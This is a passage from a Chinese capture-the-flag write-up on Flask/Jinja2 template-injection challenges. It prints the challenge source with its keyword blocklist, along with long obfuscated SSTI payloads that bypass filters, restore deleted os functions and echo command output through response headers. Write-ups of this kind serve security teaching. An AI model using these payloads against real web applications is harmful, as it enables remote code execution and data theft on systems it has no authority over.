<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23%7d&#123;%for%0ai%0ain%0aconfig|string|slice(1)%&#125;&#123;%set%0auri%0a=%0ai.399~i.398~i.20%&#125;&#123;%print(request|attr(uri))%&#125;&#123;%for%0aj%0ain%0arequest|attr(uri)|string|slice(1)%&#125;&#123;%set%0alip=%0ai.20~i.5~i.789~i.21~i.399~i.159%&#125;&#123;%set%0aglob=i.80~i.80~i.6~i.20~i.68~j.322~i.154~i.20~i.21~i.80~i.80%&#125;&#123;%print(lip)%&#125;&#123;%print(glob)%&#125;&#123;%set%0aap=i.154~i.789~i.789~i.20~i.5~j.8~i.154~i.155~i.5~i.68~i.226%&#125;&#123;%set%0aev=i.881~j.489~i.154~i.20%&#125;&#123;%set%0abuil=i.80~i.80~j.322~i.399~i.5~i.20~i.155~i.5~i.226~i.21~i.80~i.80%&#125;&#123;%set%0agei=i.80~i.80~i.6~i.227~i.155~i.5~i.155~i.227~i.159~i.80~i.80%&#125;&#123;%set%0apo=i.739~i.68~i.789~i.227~i.226%&#125;&#123;%set%0aso=i.68~i.21%&#125;&#123;%set%0aim=i.80~i.80~i.5~i.159~i.789~i.68~i.398~i.155~i.80~i.80%&#125;&#123;%print(im)%&#125;&#123;%print(op)%&#125;&#123;%print(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(so)|attr(po))%&#125;&#123;%%0aendfor%0a%&#125;&#123;%%0aendfor%0a%&#125;%7B%23</span><br></pre></td></tr></table></figure>

<p>当我获取到os模块的时候，发现popen和system都没有了。。。赫赫。</p>
<p>回globals看看有什么可以用的。</p>
<p>system被删除？我们可以想办法恢复。或者看看有没有漏掉没禁用的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import importlib</span><br><span class="line">del os.system</span><br><span class="line">importlib.reload(os)</span><br><span class="line">os.system(&#x27;whoami&#x27;)  #这时命令是成功的！</span><br></pre></td></tr></table></figure>

<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250405205925943.png" class="" title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23%7d&#123;%for%0ai%0ain%0aconfig|string|slice(1)%&#125;&#123;%set%0auri%0a=%0ai.399~i.398~i.20%&#125;&#123;%print(request|attr(uri))%&#125;&#123;%for%0aj%0ain%0arequest|attr(uri)|string|slice(1)%&#125;&#123;%set%0alip=%0ai.20~i.5~i.789~i.21~i.399~i.159%&#125;&#123;%set%0aglob=i.80~i.80~i.6~i.20~i.68~j.322~i.154~i.20~i.21~i.80~i.80%&#125;&#123;%print(lip)%&#125;&#123;%print(glob)%&#125;&#123;%set%0aap=i.154~i.789~i.789~i.20~i.5~j.8~i.154~i.155~i.5~i.68~i.226%&#125;&#123;%set%0aev=i.881~j.489~i.154~i.20%&#125;&#123;%set%0abuil=i.80~i.80~j.322~i.399~i.5~i.20~i.155~i.5~i.226~i.21~i.80~i.80%&#125;&#123;%set%0agei=i.80~i.80~i.6~i.227~i.155~i.5~i.155~i.227~i.159~i.80~i.80%&#125;&#123;%set%0apo=i.789~i.68~i.789~i.227~i.226%&#125;&#123;%set%0aso=i.68~i.21%&#125;&#123;%set%0aim=i.80~i.80~i.5~i.159~i.789~i.68~i.398~i.155~i.80~i.80%&#125;&#123;%set%0aiml=i.5~i.159~i.789~i.68~i.398~i.155~i.20~i.5~j.322%&#125;&#123;%set%0are=i.398~i.227~i.20~i.68~i.429~i.153%&#125;&#123;%set%0aco=i.20~i.21~i.7~i.272%&#125;&#123;%set%0ard=i.398~i.227~i.154~i.153%&#125;&#123;%print(im)%&#125;&#123;%print(op)%&#125;&#123;%print(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(iml)|attr(re)(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(so)))%&#125;&#123;%print(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(so)|attr(po)(co)|attr(rd)())%&#125;&#123;%%0aendfor%0a%&#125;&#123;%%0aendfor%0a%&#125;%7B%23</span><br></pre></td></tr></table></figure>

<p>接下来我们</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac /flag_h3r3</span><br></pre></td></tr></table></figure>

<p>但是他会报错？？</p>
<img src="/2025/04/09/XYCTF2025-Web-wp/bb9d6e26f451230f88ede6f3b6d5c5cd.png" class="" title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23%7d&#123;%for%0ai%0ain%0aconfig|string|slice(1)%&#125;&#123;%set%0auri%0a=%0ai.399~i.398~i.20%&#125;&#123;%print(request|attr(uri))%&#125;&#123;%for%0aj%0ain%0arequest|attr(uri)|string|slice(1)%&#125;&#123;%set%0alip=%0ai.20~i.5~i.789~i.21~i.399~i.159%&#125;&#123;%set%0aglob=i.80~i.80~i.6~i.20~i.68~j.322~i.154~i.20~i.21~i.80~i.80%&#125;&#123;%print(lip)%&#125;&#123;%print(glob)%&#125;&#123;%set%0aap=i.154~i.789~i.789~i.20~i.5~j.8~i.154~i.155~i.5~i.68~i.226%&#125;&#123;%set%0aev=i.881~j.489~i.154~i.20%&#125;&#123;%set%0abuil=i.80~i.80~j.322~i.399~i.5~i.20~i.155~i.5~i.226~i.21~i.80~i.80%&#125;&#123;%set%0agei=i.80~i.80~i.6~i.227~i.155~i.5~i.155~i.227~i.159~i.80~i.80%&#125;&#123;%set%0apo=i.789~i.68~i.789~i.227~i.226%&#125;&#123;%set%0aso=i.68~i.21%&#125;&#123;%set%0aim=i.80~i.80~i.5~i.159~i.789~i.68~i.398~i.155~i.80~i.80%&#125;&#123;%set%0aiml=i.5~i.159~i.789~i.68~i.398~i.155~i.20~i.5~j.322%&#125;&#123;%set%0are=i.398~i.227~i.20~i.68~i.429~i.153%&#125;&#123;%set%0aco=j.322~i.154~i.21~i.881~j.18~j.14~i.7~i.272~i.4~i.20~i.154~i.6~i.53~i.786~i.846~i.398~i.846%&#125;&#123;%set%0ard=i.398~i.227~i.154~i.153%&#125;&#123;%print(im)%&#125;&#123;%print(op)%&#125;&#123;%print(co)%&#125;&#123;%print(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(iml)|attr(re)(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(so)))%&#125;&#123;%print(request|attr(ap)|attr(glob)|attr(gei)(buil)|attr(gei)(im)(so)|attr(po)(co)|attr(rd)())%&#125;&#123;%%0aendfor%0a%&#125;&#123;%%0aendfor%0a%&#125;%7B%23</span><br></pre></td></tr></table></figure>

<p>尝试用base64读，发现超级长的回显，下载下来赛博厨子一下。</p>
<img src="/2025/04/09/XYCTF2025-Web-wp/2b85d95a20e4e094164d3f3ef8e422ce.png" class="" title="This is an example image">

<p>发现是一个riff。</p>
<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250405214748054.png" class="" title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;N0w_y0u_sEEEEEEEEEEEEEEE_m3!!!!!!&#125;</span><br></pre></td></tr></table></figure>





<h2 id="Now-you-see-me-2"><a href="#Now-you-see-me-2" class="headerlink" title="Now you see me 2"></a>Now you see me 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># YOU FOUND ME ;)</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   src.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 01:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># DNS config: No reversing shells for you.</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> time, random</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">enable_hook = <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event, args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>,</span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;self&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>,</span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span>,</span><br><span class="line">    <span class="string">&quot; &quot;</span>, <span class="string">&quot;dict&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referrer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;authorization&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;pragma&quot;</span>, <span class="string">&quot;mimetype&quot;</span>, <span class="string">&quot;origin&quot;</span></span><br><span class="line">                                                   <span class="string">&quot;Isn&#x27;t that enough? Isn&#x27;t that enough.&quot;</span>]</span><br><span class="line"><span class="comment"># lock_within = []</span></span><br><span class="line">allowed_endpoint = [<span class="string">&quot;static&quot;</span>, <span class="string">&quot;index&quot;</span>, <span class="string">&quot;r3al_ins1de_th0ught&quot;</span>]</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    quote = flask.request.args.get(<span class="string">&#x27;spell&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> quote:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> quote.startswith(<span class="string">&quot;fly-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> quote:</span><br><span class="line">                        <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;wouldn&#x27;t it be easier to give in?&quot;</span></span><br><span class="line">                time.sleep(random.randint(<span class="number">10</span>, <span class="number">30</span>) / <span class="number">10</span>)  <span class="comment"># No time based injections.</span></span><br><span class="line">                flask.render_template_string(<span class="string">&#x27;Let-the-magic-&#123;#&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;quote&#125;</span>&#x27;</span> + <span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Registered endpoints and functions:&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> endpoint, func <span class="keyword">in</span> app.view_functions.items():</span><br><span class="line">                    <span class="keyword">if</span> endpoint <span class="keyword">not</span> <span class="keyword">in</span> allowed_endpoint:</span><br><span class="line">                        <span class="keyword">del</span> func  <span class="comment"># No creating backdoor functions &amp; endpoints.</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="string">f&#x27;What are you doing with <span class="subst">&#123;endpoint&#125;</span> hacker?&#x27;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Let the true magic begin!&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>这里把回显去掉了，那么就有时间盲注、请求头回显、内存马、弹shell、写文件的方法。</p>
<p>这里给出一个请求头回显的基础payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__.__builtins__.setattr(lipsum.__globals__.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,&quot;protocol_version&quot;,lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read())&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这里没有回显，我们根本读不到config的内容了，那么怎么办呢？其实还有一种叫<code>endpoint</code></p>
<p><a target="_blank" rel="noopener" href="https://flask.palletsprojects.com/en/stable/api/#flask.Request.endpoint">https://flask.palletsprojects.com/en/stable/api/#flask.Request.endpoint</a></p>
<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409125208662.png" class="" title="This is an example image">

<p>我们现在本地看看效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?spell=fly-%23%7D&#123;%print(request.endpoint)%&#125;%7B%23 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br></pre></td></tr></table></figure>

<p>回显如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.6 Python/3.8.10</span><br><span class="line">Date: Wed, 09 Apr 2025 04:53:31 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br><span class="line">Let-the-magic-r3al_ins1de_th0ught</span><br></pre></td></tr></table></figure>

<p>它的回显要去除掉<code>Let-the-magic-</code>，<code>r3al_ins1de_th0ught</code>才是<code>request.endpoint</code>的值，也就是路由的函数名，那么我们就可以开始构造了。</p>
<p>这么点字符肯定是不够的，我们用<code>request.url</code>也可以，用<code>request.data</code>等其实都可以。data就是获取POST传入的参数，可能会比较好观察，那么我们这里就用data。</p>
<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409130600540.png" class="" title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;123456789abcdefghijklmnopqrstuvwxyz_-&#123;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>然后开始构造请求头回显的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?spell=fly-%23%7D&#123;%for%0ai%0ain%0arequest.endpoint|string|slice(1)%&#125;&#123;%set%0adat=i.9~i.2~i.18~i.2%&#125;&#123;%for%0aj%0ain%0arequest|attr(dat)|string|slice(1)%&#125;&#123;%set%0alip=j.22~j.19~j.26~j.29~j.31~j.23%&#125;&#123;%set%0aglo=j.37~j.37~j.17~j.22~j.25~j.0~j.11~j.22~j.29~j.37~j.37%&#125;&#123;%set%0abuil=j.37~j.37~j.0~j.31~j.19~j.22~j.30~j.19~j.24~j.29~j.37~j.37%&#125;&#123;%set%0aset=j.29~j.15~j.30~j.11~j.30~j.30~j.28%&#125;&#123;%set%0aspe=j.37~j.37~j.29~j.26~j.15~j.13~j.37~j.37%&#125;&#123;%set%0aini=j.37~j.37~j.19~j.24~j.19~j.30~j.37~j.37%&#125;&#123;%set%0as=j.29~j.35~j.29%&#125;&#123;%set%0amod=j.23~j.25~j.14~j.31~j.22~j.15~j.29%&#125;&#123;%set%0awer=j.33~j.15~j.28~j.21~j.36~j.15~j.31~j.17%&#125;&#123;%set%0aget=j.37~j.37~j.17~j.15~j.30~j.19~j.30~j.15~j.23~j.37~j.37%&#125;&#123;%set%0aserv=j.29~j.15~j.28~j.32~j.19~j.24~j.17%&#125;&#123;%set%0awsg=j.41~j.42~j.43~j.44~j.45~j.15~j.27~j.31~j.15~j.29~j.30~j.46~j.11~j.24~j.14~j.22~j.15~j.28%&#125;&#123;%set%0averi=j.26~j.28~j.25~j.30~j.25~j.13~j.25~j.22~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0aso=j.25~j.29%&#125;&#123;%set%0asv=j.29~j.15~j.28~j.32~j.15~j.28~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0apen=j.26~j.25~j.26~j.15~j.24%&#125;&#123;%set%0aap=j.11~j.26~j.26~j.22~j.19~j.13~j.11~j.30~j.19~j.25~j.24%&#125;&#123;%set%0aop=j.26~j.25~j.26%&#125;&#123;%set%0aim=j.37~j.37~j.19~j.23~j.26~j.25~j.28~j.30~j.37~j.37%&#125;&#123;%print(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(set)(g|attr(op)|attr(glo)|attr(get)(s)|attr(mod)|attr(get)(wer)|attr(serv)|attr(wsg),veri,g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(so)))%&#125;&#123;%endfor%&#125;&#123;%endfor%&#125;%7B%23 HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20003</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line">123456789abcdefghijklmnopqrstuvwxyz_-&#123;&#125;WSGIRH</span><br></pre></td></tr></table></figure>

<p>好累啊！！！成功一半了，接下来就是处理被删除的<code>popen</code>。</p>
<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409142739311.png" class="" title="This is an example image">



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?spell=fly-%23%7D&#123;%for%0ai%0ain%0arequest.endpoint|string|slice(1)%&#125;&#123;%set%0adat=i.9~i.2~i.18~i.2%&#125;&#123;%for%0aj%0ain%0arequest|attr(dat)|string|slice(1)%&#125;&#123;%set%0alip=j.22~j.19~j.26~j.29~j.31~j.23%&#125;&#123;%set%0aglo=j.37~j.37~j.17~j.22~j.25~j.0~j.11~j.22~j.29~j.37~j.37%&#125;&#123;%set%0abuil=j.37~j.37~j.0~j.31~j.19~j.22~j.30~j.19~j.24~j.29~j.37~j.37%&#125;&#123;%set%0aset=j.29~j.15~j.30~j.11~j.30~j.30~j.28%&#125;&#123;%set%0aspe=j.37~j.37~j.29~j.26~j.15~j.13~j.37~j.37%&#125;&#123;%set%0aini=j.37~j.37~j.19~j.24~j.19~j.30~j.37~j.37%&#125;&#123;%set%0as=j.29~j.35~j.29%&#125;&#123;%set%0amod=j.23~j.25~j.14~j.31~j.22~j.15~j.29%&#125;&#123;%set%0awer=j.33~j.15~j.28~j.21~j.36~j.15~j.31~j.17%&#125;&#123;%set%0aget=j.37~j.37~j.17~j.15~j.30~j.19~j.30~j.15~j.23~j.37~j.37%&#125;&#123;%set%0aserv=j.29~j.15~j.28~j.32~j.19~j.24~j.17%&#125;&#123;%set%0awsg=j.41~j.42~j.43~j.44~j.45~j.15~j.27~j.31~j.15~j.29~j.30~j.46~j.11~j.24~j.14~j.22~j.15~j.28%&#125;&#123;%set%0averi=j.26~j.28~j.25~j.30~j.25~j.13~j.25~j.22~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0aso=j.25~j.29%&#125;&#123;%set%0asv=j.29~j.15~j.28~j.32~j.15~j.28~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0apen=j.26~j.25~j.26~j.15~j.24%&#125;&#123;%set%0aap=j.11~j.26~j.26~j.22~j.19~j.13~j.11~j.30~j.19~j.25~j.24%&#125;&#123;%set%0aop=j.26~j.25~j.26%&#125;&#123;%set%0aim=j.37~j.37~j.19~j.23~j.26~j.25~j.28~j.30~j.37~j.37%&#125;&#123;%set%0aiml=j.19~j.23~j.26~j.25~j.28~j.30~j.22~j.19~j.0%&#125;&#123;%set%0aloa=j.28~j.15~j.22~j.25~j.11~j.14%&#125;&#123;%set%0ard=j.28~j.15~j.11~j.14%&#125;&#123;%set%0aco=j.22~j.29~j.47~j.48%&#125;&#123;%print(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(iml)|attr(loa)(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(so)))%&#125;&#123;%print(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(set)(g|attr(op)|attr(glo)|attr(get)(s)|attr(mod)|attr(get)(wer)|attr(serv)|attr(wsg),veri,g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(so)|attr(pen)(co)|attr(rd)()))%&#125;&#123;%endfor%&#125;&#123;%endfor%&#125;%7B%23 HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line">123456789abcdefghijklmnopqrstuvwxyz_-&#123;&#125;WSGIRH /</span><br></pre></td></tr></table></figure>

<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409143622617.png" class="" title="This is an example image">

<p>其实上述payload几乎是可以直接拿去用的，只需要改一下data的构造和command的构造即可。</p>
<p>然后我们用base64命令来读取<code>/flag</code></p>
